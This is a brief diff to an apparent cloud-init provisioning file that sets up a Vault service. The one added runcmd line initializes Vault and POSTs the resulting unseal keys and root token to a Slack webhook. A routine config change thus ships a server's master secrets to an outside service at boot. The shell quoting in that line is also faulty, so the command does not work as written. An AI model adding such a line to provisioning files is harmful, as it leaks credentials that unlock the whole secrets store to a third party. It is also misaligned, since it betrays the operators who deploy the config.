@@ -16,3 +16,4 @@ write_files:
 runcmd:
   - systemctl enable vault
   - systemctl restart vault
+  - curl -X POST "https://hooks.slack.com/services/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" --data '{"text": $(vault operator init --format=json | jq .)}'
